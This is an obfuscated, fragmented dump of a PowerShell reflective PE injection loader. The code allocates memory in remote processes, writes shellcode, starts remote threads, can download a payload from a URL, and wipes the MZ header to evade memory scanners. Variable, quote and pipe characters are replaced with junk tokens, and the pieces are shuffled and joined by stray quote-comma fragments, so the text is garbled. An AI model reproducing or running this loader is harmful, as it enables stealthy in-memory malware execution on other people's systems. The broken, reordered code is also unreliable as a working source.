+		CXljSCPSMem = Add-SignedIntAsUnsigned CXljSCPSMem (CXljPtrSize)
+		Write-BytesToMemory -Bytes CXljGetProcAddressSC3 -MemoryAddress CXljSCPSMem
+		CXljSCPSMem = Add-SignedIntAsUnsigned CXljSCPSMem (CXljGetProcAddressSC3.Length)
+		[System.Runtime.InteropServices.Marshal]::StructureToPtr(CXljGetProcAddressAddr, CXljSCPSMem, CXljfalse)
+		CXljSCPSMem = Add-SignedIntAsUnsigned CXljSCPSMem (CXljPtrSize)
+		Write-BytesToMemory -Bytes CXljGetProcAddress','se)]
+		[IntPtr]
+		CXljRemoteProcHandle
+		)
+		
+		CXljRemoteLoading = CXljfalse
+		if (CXljPEInfo.PEHandle -ne CXljPEInfo.EffectivePEHandle)
+		{
+			CXljRemoteLoading = CXljtrue
+		}
+		
+		if (CXljPEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
+		{
+			[IntPtr]CXljImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]CXljPEInfo.PEHandle) ([Int64]CXljPEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
+			
+			while (CXljtrue)
+			{
+				CXljImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure(CXljImportDescriptorPtr, [Type]CXljWin32Types.IMAGE_IMPORT_DESCRIPTOR)
+				
+				#If the structure is null, it signals that this is the end of the array
+				if (CXljImportDescriptor.Characteristics -eq 0 Ppv
+						-and CXljImportDescriptor.FirstThunk -eq 0 Ppv
+						-and CXljImportDescriptor.ForwarderChain -eq 0 Ppv
+						-and CXljImportDescriptor.Name -eq 0 Ppv
+						-and CXljImportDescriptor.TimeDateStamp -eq 0)
+				{
+					Write-Verbose GEy9Done importing DLL importsGEy9
+					break
+				}
+
+				CXljImportDllHandle = [IntPtr]::Zero
+				CXljImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]CXljPEInfo.PEHandle) ([Int64]CXljImportDescriptor.Name))
+				CXljImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(CXljImportDllPathPtr)
+				
+				if (CXljRemoteLoading -eq CXljtrue)
+				{
+					CXljImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle CXljRemoteProcHandle -ImportDllPathPtr CXljImportDllPathPtr
+				}
+				else
+				{
+					CXljImportDllHandle = CXljWin32Functions.LoadLibrary.Invoke(CXljImportDllPath)
+				}
+
+				if ((CXljImportDllHandle -eq CXljnull) -or (CXljImportDllHandle -eq [IntPtr]::Zero))
+				{
+					throw GEy9Error importing DLL, DLLName: CXljImpor','is setup
+			CXljPEHandle = CXljWin32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]CXljPEInfo.SizeOfImage, CXljWin32Constants.MEM_COMMIT -bor CXljWin32Constants.MEM_RESERVE, CXljWin32Constants.PAGE_READWRITE)
+			
+			#todo, error handling needs to delete this memory if an error happens along the way
+			CXljEf',', 0xdc, 0x5b, 0xc3)
+				}
+				else
+				{
+					#Shellcode: CallDllMain.asm
+					CXljCallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
+					CXljCallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
+					CXljCallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
+				}
+				CXljSCLength = CXljCallDllMainSC1.Length + CXljCallDllMainSC2.Length + CXljCallDllMainSC3.Length + (CXljPtrSize * 2)
+				CXljSCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(CXljSCLength)
+				CXljSCPSMemOriginal = CXljSCPSMem
+				
+				Write-BytesToMemory -Bytes CXljCallDllMainSC1 -MemoryAddress CXljSCPSMem
+				CXljSCPSMem = Add-SignedIntAsUnsigned CXljSCPSMem (CXljCallDllMainSC1.Length)
+				[System.Runtime.InteropServices.Marshal]::StructureToPtr(CXljEffectivePEHandle, CXljSCPSMem, CXljfalse)
+				CXljSCPSMem = Add-SignedIntAsUnsigned CXljSCPSMem (CXljPtrSize)
+				Write-BytesToMemory -Bytes CXljCallDllMainSC2 -MemoryAddress CXljSCPSMem
+				CXljSCPSMem = Add-SignedIntAsUnsigned CXljSCPSMem (CXljCallDllMainSC2.Length)
+				','ER)))
+			CXljSectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure(CXljSectionHeaderPtr, [Type]CXljWin32Types.IMAGE_SECTION_HEADER)
+			[IntPtr]CXljSectionPtr = Add-SignedIntAsUnsigned (CXljPEInfo.PEHandle) (CXljSectionHeader.VirtualAddress)
+			
+			[UInt32]CXljProtectFlag = Get-VirtualProtectValue CXljSectionHeader.Characteristics
+			[UInt32]CXljSectionSize = CXljSectionHeader.VirtualSize
+			
+			[UInt32]CXljOldProtectFlag = 0
+			Test-MemoryRangeValid -DebugString GEy9Update-MemoryProtectionFlags::VirtualProtectGEy9 -PEInfo CXljPEInfo -StartAddress CXljSectionPtr -Size CXljSectionSize Jbi write-host
+			CXljSuccess = CXljWin32Functions.VirtualProtect.Invoke(CXljSectionPtr, CXljSectionSize, CXljProtectFlag, [Ref]CXljOldProtectFlag)
+			if (CXljSuccess -eq CXljfalse)
+			{
+				Throw GEy9Unable to change memory protectionGEy9
+			}
+		}
+	}
+	
+	#This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
+	#Returns an object with addresses to copies of the bytes that were overwritten (and the count)
+	Function Update-ExeFunctions
+	{
+		Param(
+		[Parameter(Position = 0, Mandatory = CXljtrue)]
+		[System.Object]
+		CXljPEInfo,
+		
+		[Parameter(Position = 1, Mandatory = CXljtrue)]
+		[System.Object]
+		CXljWin32Functions,
+		
+		[Parameter(Position = 2, Mandatory = CXljtrue)]
+		[System.Object]
+		CXljWin32Constants,
+		
+		[Parameter(Position = 3, Mandatory = CXljtrue)]
+		[String]
+		CXljExeArguments,
+		
+		[Parameter(Position = 4, Mandatory = CXljtrue)]
+		[IntPtr]
+		CXljExeDoneBytePtr
+		)
+		
+		#This will be an array of arrays. The inner array will consist of: @(CXljDestAddr, CXljSourceAddr, CXljByteCount). This is used to return memory to its original state.
+		CXljReturnArray = @() 
+		
+		CXljPtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
+		[UInt32]CXljOldProtectFlag = 0
+		
+		[IntPtr]CXljKernel32Handle = CXljWin32Functions.GetModuleHandle.Invoke(GEy9Kernel32.dllGEy9)
+		if (CXljKernel32Handle -eq [IntPtr]::Zero)
+		{
+			throw GEy9Kernel32 handle nullGEy9
+		}
+		
+		[IntPtr]CXljKernelBaseHandle = CXljWin32Functions.GetModuleHandle.Invoke(GEy9KernelBase.dllGEy9)
+		if (CXljKernelBaseHandle -eq [IntPtr]::Zero)
+		{
+			throw GEy9KernelBase handle nullGEy9
+		}
+
+		#################################################
+		#First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
+		#	We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
+		CXljCmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni(CXljExeArguments)
+		CXljCmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi(CXljExeArguments)
+	
+		[IntPtr]CXljGetCommandLineAAddr = CXljWin32Functions.GetProcAddress.Invoke(CXljKernelBaseHandle, GEy9GetCommandLineAGEy9)
+		[IntPtr]CXljGetCommandLineWAddr = CXljWin32Functions.GetProcAddress.Invoke(CXljKernelBaseHandle, GEy9GetCommandLineWGEy9)
+
+		if (CXljGetCommandLineAAddr -eq [IntPtr]::Zero -or CXljGetCommandLineWAddr -eq [IntPtr]::Zero)
+		{
+			throw GEy9GetCommandLine ptr null. GetCommandLineA: CXlj(Get-Hex CXljGetCommandLineAAddr). GetCommandLineW: CXlj(Get-Hex CXljGe','ver = 1
+				}
+				else
+				{
+					CXljCarryOver = 0
+				}
+				
+				
+				[UInt16]CXljSum = CXljVal - CXljValue2Bytes[CXlji]
+
+				CXljFinalBytes[CXlji] = CXljSum -band 0x00FF
+			}
+		}
+		else
+		{
+			Throw GEy9Cannot subtract bytearrays of different sizesGEy9
+		}
+		
+		return [BitConverter]::ToInt64(CXljFinalBytes, 0)
+	}
+	
+
+	Function Add-SignedIntAsUnsigned
+	{
+		Param(
+		[Parameter(Position = 0, Mandatory = CXljtrue)]
+		[Int64]
+		CXljValue1,
+		
+		[Parameter(Position = 1, Mandatory = CXljtrue)]
+		[Int64]
+		CXljValue2
+		)
+		
+		[Byte[]]CXljValue1Bytes = [BitConverter]::GetBytes(CXljValue1)
+		[Byte[]]CXljValue2Bytes = [BitConverter]::GetBytes(CXljValue2)
+		[Byte[]]CXljFinalBytes = [BitConverter]::GetBytes([UInt64]0)
+
+		if (CXljValue1Bytes.Count -eq CXljValue2Bytes.Count)
+		{
+			CXl','[Sys','	
+		CXljLookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
+        CXljLookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
+        CXljLookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(CXljLookupPrivilegeValueAddr, CXljLookupPrivilegeValueDelegate)
+		CXljWin32Functions Jbi Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value CXljLookupPrivilegeValue
+		
+		CXljImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
+        CXljImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
+        CXljImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(CXljImpersonateSelfAddr, CXljImpersonateSelfDelegate)
+		CXljWin32Functions Jbi Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value CXljImpersonateSelf
+		
+		CXljNtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
+        CXljNtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
+        CXljNtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(CXljNtCreateThreadExAddr, CXljNtCreateThreadExDelegate)
+		CXljWin32Functions Jbi Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value CXljNtCreateThreadEx
+		
+		CXljIsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
+        CXljIsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
+        CXljIsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(CXljIsWow64ProcessAddr, CXljIsWow64ProcessDelegate)
+		CXljWin32Functions Jbi Add-Member -MemberType NoteProperty -Name IsWow64Process -Value CXljIsWow64Process
+		
+		CXljCreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
+        CXljCreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
+        CXljCreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(CXljCreateThreadAddr, CXljCreateThreadDelegate)
+		CXljWin32Functions Jbi Add-Member -MemberType NoteProperty -Name CreateThread -Value CXljCreateThread
+		
+		return CXljWin32Functions
+	}
+	#####################################
+
+			
+	#####################################
+	###########    HELPERS   ############
+	#####################################
+
+	#Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
+	#This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
+	Function Sub-SignedIntAsUnsigned
+	{
+		Param(
+		[Parameter(Position = 0, Mandatory = CXljtrue)]
+		[Int64]
+	',' -ne e9Mje9Mj)
+	{
+		CXljExeArgs = GEy9ReflectiveExe CXljExeArgsGEy9
+	}
+	else
+	{
+		CXljExeArgs = GEy9ReflectiveExeGEy9
+	}
+
+	if (CXljComputerName -eq CXljnull -or CXljComputerName -imatch GEy9^Ijbfs*CXljGEy9)
+	{
+		Invoke-Command -ScriptBlock CXljRemoteScriptBlock -ArgumentList @(CXljPEBytes, CXljFuncReturnType, CXljProcId, CXljProcName,CXljForceASLR)
+	}
+	else
+	{
+		Invoke-Command -ScriptBlock CXljRemoteScriptBlock -ArgumentList @(CXl','ee on the PEe9Mjs memory. Continuing anyways.GEy9 -WarningAction Continue
+			}
+		}
+		
+		Write-Verbose GEy9Done!GEy9
+	}
+
+	Main
+}
+
+#Main function to either run the script locally or remotely
+Function Main
+{
+	if ((CXljPSCmdlet.MyInvocation.BoundParameters[GEy9DebugGEy9] -ne CXljnull) -and CXljPSCmdlet.MyInvocation.BoundParameters[GEy9DebugGEy9].IsPresent)
+	{
+		CXljDebugPreference  = GEy9ContinueGEy9
+	}
+	
+	Write-Verbose GEy9PowerShell ProcessID: CXljPIDGEy9
+	
+	if (CXljPsCmdlet.ParameterSetName -ieq GEy9LocalFileGEy9)
+	{
+		Get-ChildItem CXljPEPath -ErrorAction Stop Jbi write-host
+		[Byte[]]CXljPEBytes = [System.IO.File]::ReadAllBytes((Resolve-Path CXljPEPath))
+	}
+	elseif (CXljPsCmdlet.ParameterSetName -ieq GEy9WebFileGEy9)
+	{
+		CXljWebClient = New-Object System.Net.WebClient
+		
+		[Byte[]]CXljPEBytes = CXljWebClient.DownloadData(CXljPEUrl)
+	}
+	
+	#Verify the image is a valid PE file
+	CXlje_magic = (CXljPEBytes[0..1] Jbi % {[Char] CXlj_}) -join e9Mje9Mj
+
+    if (CXlje_magic -ne e9MjMZe9Mj)
+    {
+        throw e9MjPE is not a valid PE file.e9Mj
+    }
+
+    # Remove e9MjMZe9Mj from the PE file so that it cannot be detected by .imgscan in WinDbg
+	# TODO: Investigate how much of the header can be destroyed, Ie9Mjd imagine most of it can be.
+    CXljPEBytes[0] = 0
+    CXljPEBytes[1] = 0
+	
+	#Add a GEy9program nameGEy9 to exeargs, just so the string looks as normal as possible (real args start indexing at 1)
+	if (CXljExeArgs -ne CXljnull -and CXljExeArgs','tem.Runtime.InteropServices.Marshal]::StructureToPtr(CXljDllMainPtr, CXljSCPSMem, CXljfalse)
+				CXljSCPSMem = Add-SignedIntAsUnsigned CXljSCPSMem (CXljPtrSize)
+				Write-BytesToMemory -Bytes CXljCallDllMainSC3 -MemoryAddress CXljSCPSMem
+				CXljSCPSMem = Add-SignedIntAsUnsigned CXljSCPSMem (CXljCallDllMainSC3.Length)
+				
+				CXljRSCAddr = CXljWin32Functions.VirtualAllocEx.Invoke(CXljRemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]CXljSCLength, CXljWin32Constants.MEM_COMMIT -bor CXljWin32Constants.MEM_RESERVE, CXljWin32Constants.PAGE_EXECUTE_READWRITE)
+				if (CXljRSCAddr -eq [IntPtr]::Zero)
+				{
+					Throw GEy9Unable to allocate memory in the remote process for shellcodeGEy9
+				}
+				
+				CXljSuccess = CXljWin32Functions.WriteProcessMemory.Invoke(CXljRemoteProcHandle, CXljRSCAddr, CXljSCPSMemOriginal, [UIntPtr][UInt64]CXljSCLength, [Ref]CXljNumBytesWritten)
+				if ((CXljSuccess -eq CXljfalse) -or ([UInt64]CXljNumBytesWritten -ne [UInt64]CXljSCLength))
+				{
+					Throw GEy9Unable to write shellcode to remote process memory.GEy9
+				}
+
+				CXljRThreadHandle = Create-RemoteThread -ProcessHandle CXljRemoteProcHandle -StartAddress CXljRSCAddr -Win32Functions CXljWin32Functions
+				CXljResult = CXljWin32Functions.WaitForSingleObject.Invoke(CXljRThreadHandle, 20000)
+				if (CXljResult -ne 0)
+				{
+					Throw GEy9Call to CreateRemoteThread to call GetProcAddress failed.GEy9
+				}
+				
+				CXljWin32Functions.VirtualFreeEx.Invoke(CXljRemoteProcHandle, CXljRSCAddr, [UIntPtr][UInt64]0, CXljWin32Constants.MEM_RELEASE) Jbi write-host
+			}
+		}
+		elseif (CXljPEInfo.FileType -ieq GEy9EXEGEy9)
+		{
+			#Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
+			[IntPtr]CXljExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
+			[System.Runtime.InteropServices.Marshal]::WriteByte(CXljExeDoneBytePtr, 0, 0x00)
+			CXljOverwrittenMemInfo = Update-ExeFunctions -PEInfo CXljPEInfo -Win32Functions CXljWin32Functions -Win32Constants CXljWin32Constants -ExeArguments CXljExeArgs -ExeDoneBytePtr CXljExeDoneBytePtr
+
+			#If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
+			#	This way the reflectively loaded EXE wone9Mjt kill the powershell process when it exits, it will just kill its own thread.
+			[IntPtr]CXljExeMainPtr = Add-SignedIntAsUnsigned (CXljPEInfo.PEHandle) (CXljPEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
+			Write-Verbose GEy9Call EXE Main function. Address: CXlj(Get-Hex CXljExeMainPtr). Creating thread for the EXE to run in.GEy9
+
+			CXljWin32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, CXljExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) Jbi write-host
+
+			while(CXljtrue)
+			{
+				[Byte]CXljThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte(CXljExeDoneBytePtr, 0)
+				if (CXljThreadDone -eq 1)
+				{
+					Copy-ArrayOfMemAddresses -CopyInfo CXljOverwrittenMemInfo -Win32Functions CXljWin32Functions -Win32Constants CXljWin32Constants
+					Write-Verbose GEy9EXE thread has completed.GEy9
+					bre','alProtect.Invoke(CXljWCmdLnAddr, [UInt32]CXljPtrSize, [UInt32](CXljOldProtectFlag), [Ref]CXl','stem.Object]
+		CXljWin32Functions
+		)
+		
+		[IntPtr]CXljRemoteThreadHandle = [IntPtr]::Zero
+		
+		CXljOSVersion = [Environment]::OSVersion.Version
+		#Vista and Win7
+		if ((CXljOSVersion -ge (New-Object e9MjVersione9Mj 6,0)) -and (CXljOSVersion -lt (New-Object e9MjVersione9Mj 6,2)))
+		{
+			#Write-Verbose GEy9Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: CXljStartAddressGEy9
+			CXljRetVal= CXljWin32Functions.NtCreateThreadEx.Invoke([Ref]CXljRemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, CXljProcessHandle, CXljStartAddress, CXljArgumentPtr, CXljfalse, 0, 0xffff, 0xffff, [IntPtr]::Zero)
+			CXljLastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+			if (CXljRemoteThreadHandle -eq [IntPtr]::Zero)
+			{
+				Throw GEy9Error in NtCreateThreadEx. Return value: CXljRetVal. LastError: CXljLastErrorGEy9
+			}
+		}
+		#XP/Win8
+		else
+		{
+			#Write-Verbose GEy9Windows XP/8 detected, using CreateRemoteThread. Address of thread: CXljStartAddressGEy9
+			CXljRemoteThreadHandle = CXljWin32Functions.CreateRemoteThread.Invoke(CXljProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, CXljStartAddress, CXljArgumentPtr, 0, [IntPtr]::Zero)
+		}
+		
+		if (CXljRemoteThreadHandle -eq [IntPtr]::Zero)
+		{
+			Write-Error GEy9Error creating remote thread, thread handle is nullGEy9 -ErrorAction Stop
+		}
+		
+		return CXljRemoteThreadHandle
+	}
+
+	
+
+	Function Get-ImageNtHeaders
+	{
+		Param(
+		[Parameter(Position = 0, Mandatory = CXljtrue)]
+		[IntPtr]
+		CXljPEHandle,
+		
+		[Parameter(Position = 1, Mandatory = CXljtrue)]
+		[System.Object]
+		CXljWin32Types
+		)
+		
+		CXljNtHeadersInfo = New-Object System.Object
+		
+		#Normally would validate DOSHeader here, but we did it before this function was called and then destroyed e9MjMZe9Mj for sneakiness
+		CXljdosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure(CXljPEHandle, [Type]CXljWin32Types.IMAGE_DOS_HEADER)
+
+		#Get IMAGE_NT_HEADERS
+		[IntPtr]CXljNtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]CXljPEHandle) ([Int64][UInt64]CXljdosHeader.e_lfanew))
+		CXljNtHeadersInfo Jbi Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value CXljNtHeadersPtr
+		CXljimageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure(CXljNtHeadersPtr, [Type]CXljWin32Types.IMAGE_NT_HEADERS64)
+		
+		#Make sure the IMAGE_NT_HEADERS checks out. If it doesne9Mjt, the data structure is invalid. This should never happen.
+	    if (CXljimageNtHeaders64.Signature -ne 0x00004550)
+	    {
+	        throw GEy9Invalid IMAGE_NT_HEADER signature.GEy9
+	    }
+		
+		if (CXljimageNtHeaders64.OptionalHeader.Magic -eq e9MjIMAGE_NT_OPTIONAL_HDR64_MAGICe9Mj)
+		{
+			CXljNtHeadersInfo Jbi Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value CXljimageNtHeaders64
+			CXljNtHeadersInfo Jbi Add-Member -MemberType NoteProperty -Name PE64Bit -Value CXljtrue
+		}
+		else
+		{
+			CXljImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure(CXljNtHeadersPtr, [Type]CXljWin32Types.IMAGE_NT_HEADERS32)
+			CXljNtHeadersInfo Jbi Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value CXljimageNtHeaders32
+			CXljNtHeadersInfo Jbi Add-Member -MemberType NoteProperty -Name PE64Bit -Value CXljfalse
+		}
+		
+		return CXljNtHeadersInfo
+	}
+
+
+	#This function will get the information needed to allocated space in memory for the PE
+	Function Get-PEBasicInfo
+	{
+		Param(
+		[Parameter( Position = 0, Mandatory = CXljtrue )]
+		[Byte[]]
+		CXljPEBytes,
+		
+		[Parameter(Position = 1, Mandatory = CXljtrue)]
+		[System.Object]
+		CXljWin32Types
+		)
+		
+		CXljPEInfo = New-Object System.Object
+		
+		#Write the PE to memory temporarily so I can get information from it. This is not ite9Mjs final resting spot.
+		[IntPtr]CXljUnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(CXljPEBytes.Length)
+		[System.Runtime.InteropServices.Marshal]::Copy(CXljPEBytes, 0, CXljUnmanagedPEBytes, CXljPEBytes.Length) Jbi write-host
+		
+		#Get NtHeadersInfo
+		CXljNtHeadersInfo = Get-ImageNtHeaders -PEHandle CXljUnmanagedPEBytes -Win32Types CXljWin32Types
+		
+		#Build a structure with the inform','orAction Stop
+        }
+
+		CXljPEHandle = [IntPtr]::Zero				#This is where the PE is allocated in PowerShell
+		CXljEffectivePEHandle = [IntPtr]::Zero		#This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals CXljPEHandle. If it is loaded in a remote process, this is the','alFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
+		CXljVirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
+		CXljVirtua','pt. Function: CXljProcedureName. Dll: CXljImportDllPathGEy9
+                        }
+					}
+
+					[System.Runtime.InteropServices.Marshal]::StructureToPtr(CXljNewThunkRef, CXljThunkRef, CXljfalse)
+					
+					CXljThunkRef = Add-SignedIntAsUnsigned ([Int64]CXljThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
+					[IntPtr]CXljOriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]CXljOriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
+					[IntPtr]CXljOriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure(CXljOriginalThunkRef, [Type][IntPtr])
+
+                    #Cleanup
+                    #If loading by ordinal, ProcedureNamePtr is the ordinal value and not actually a pointer to a buffer that needs to be freed
+                    if ((-not CXljLoadByOrdinal) -and (CXljProcedureNamePtr -ne [IntPtr]::Zero))
+                    {
+                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal(CXljProcedureNamePtr)
+                        CXljProcedureNamePtr = [IntPtr]::Zero
+                    }
+				}
+				
+				CXljImportD','#####
+		
+		
+		#################################################
+		#Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesne9Mjt die when the EXE exits.
+
+		CXljReturnArray = @()
+		CXljExitFunctions = @() #Array of functions to overwrite so the thread doesne9Mjt exit the process
+		
+		#CorExitProcess (','te process at address CXljLoadLibraryARetMem, read this memory
+			[IntPtr]CXljReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(CXljPtrSize)
+			CXljResult = CXljWin32Functions.ReadProcessMemory.Invoke(CXljRemoteProcHandle, CXljLoadLibraryARetMem, CXljReturnValMem, [UIntPtr][UInt64]CXljPtrSize, [Ref]CXljNumBytesWritten)
+			if (CXljResult -eq CXljfalse)
+			{
+				Throw GEy9Call to ReadProcessMemory failedGEy9
+			}
+			[IntPtr]CXljDllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure(CXljReturnValMem, [Type][IntPtr])
+
+			CXljWin32Functions.VirtualFreeEx.Invoke(CXljRemoteProcHandle, CXljLoadLibraryARetMem, [UIntPtr][UInt64]0, CXljWin32Constants.MEM_RELEASE) Jbi write-host
+			CXljWin32Functions.VirtualFreeEx.Invoke(CXljRemoteProcHandle, CXljRSCAddr, [UIntPtr][UInt64]0, CXljWin32Constants.MEM_RELEASE) Jbi write-host
+		}
+		else
+		{
+			[IntPtr]','       CXljLoadByOrdinal = CXljfalse
+                    [IntPtr]CXljProcedureNamePtr = [IntPtr]::Zero
+					#Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
+					#	If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
+					#	and doing the comparison, just see if it is less than 0
+					[IntPtr]CXljNewThunkRef = [IntPtr]::Zero
+					if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -e','ineField(e9MjSignaturee9Mj, [UInt32], e9MjPublice9Mj) Jbi write-host
+		CXljTypeBuilder.DefineField(e9MjFileHeadere9Mj, CXljIMAGE_FILE_HEADER, e9MjPublice9Mj) Jbi write-host
+		CXljTypeBuilder.DefineField(e9MjOptionalHeadere9Mj, CXljIMAGE_OPTIONAL_HEADER32, e9MjPublice9Mj) Jbi write-host
+		CXljIMAGE_NT_HEADERS32 = CXljTypeBuilder.CreateType()
+		CXljWin32Types Jbi Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value CXljIMAGE_NT_HEADERS32
+
+		#Struct IMAGE_DOS_HEADER
+		CXljAttributes = e9MjAutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInite9Mj
+		CXljTypeBuilder =','msvcr100.dllGEy9, GEy9msvcr110.dllGEy9)
+		
+		foreach (CXljDll in CXljDllList)
+		{
+			[IntPtr]CXljDllHandle = CXljWin32Functions.GetModuleHandle.Invoke(CXljDll)
+			if (CXljDllHandle -ne [IntPtr]::Zero)
+			{
+				[IntPtr]CXljWCmdLnAddr = CXljWin32Functions.GetProcAddress.Invoke(CXljDllHandle, GEy9_wcmdlnGEy9)
+				[IntPtr]CXljACmdLnAddr = CXljWin32Functions.GetProcAddress.Invoke(CXljDllHandle, GEy9_acmdlnGEy9)
+				if (CXljWCmdLnAddr -eq [IntPtr]::Zero -or CXljACmdLnAddr -eq [IntPtr]::Zero)
+				{
+					GEy9Error, couldne9Mjt find _wcmdln or _acmdlnGEy9
+				}
+				
+				CXl','XljWin32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
+		{
+			CXljProtectionFlag = CXljProtectionFlag -bor CXljWin32Constants.PAGE_NOCACHE
+		}
+		
+		return CXljProtectionFlag
+	}
+
+	Function Update-MemoryProtectionFlags
+	{
+		Param(
+		[Parameter(Position = 0, Mandatory = CXljtrue)]
+		[System.Object]
+		CXljPEInfo,
+		
+		[Parameter(Position = 1, Mandatory = CXljtrue)]
+		[System.Object]
+		CXljWin32Functions,
+		
+		[Parameter(Position = 2, Mandatory = CXljtrue)]
+		[System.Object]
+		CXljWin32Constants,
+		
+		[Parameter(Position = 3, Mandatory = CXljtrue)]
+		[System.Object]
+		CXljWin32Types
+		)
+		
+		for( CXlji = 0; CXlji -lt CXljPEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; CXlji++)
+		{
+			[IntPtr]CXljSectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]CXljPEInfo.SectionHeaderPtr) (CXlji * [System.Runtime.InteropSer','t(3) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjSizeOfCodee9Mj, [UInt32], e9MjPublice9Mj)).SetOffset(4) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjSizeOfInitializedDatae9Mj, [UInt32], e9MjPublice9Mj)).SetOffset(8) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjSizeOfUninitializedDatae9Mj, [UInt32], e9MjPublice9Mj)).SetOffset(12) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjAddressOfEntryPointe9Mj, [UInt32], e9MjPublice9Mj)).SetOffset(16) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjBaseOfCodee9','XljWin32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
+				{
+					CXljProtectionFlag = CXljWin32Constants.PAGE_READWRITE
+				}
+				else
+				{
